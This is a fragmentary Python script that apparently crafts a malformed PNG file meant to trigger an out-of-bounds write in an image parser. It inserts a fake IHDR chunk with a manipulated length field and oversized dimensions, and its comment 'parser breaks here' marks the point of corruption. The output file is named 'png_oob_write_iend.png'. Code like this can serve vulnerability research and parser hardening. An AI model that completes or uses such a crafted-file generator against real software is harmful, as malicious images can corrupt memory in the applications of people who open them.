...
def PNGEncode(data, width, height, bpp):
    ...
    IHDR += struct.pack(IHDR_CHUNK, width, height, 16, _COLOR_TYPE, _COMPRESSION, _FILTER, _INTERLACE)
    ...
    # Fake IHDR
    # -4 because length for crc gets added even before parsing data->file->offset + len + 4
    IHDR  = struct.pack(CHUNK_HEADER, struct.calcsize(IHDR_CHUNK_FAKE) - 4, ord('I'), ord('H'), ord('D'), ord('R'))
    IHDR += struct.pack(IHDR_CHUNK_FAKE, width + 256, height + 256, 0xFF)		# parser breaks here
    png.write(IHDR)
...
output = open("png_oob_write_iend.png", "wb")
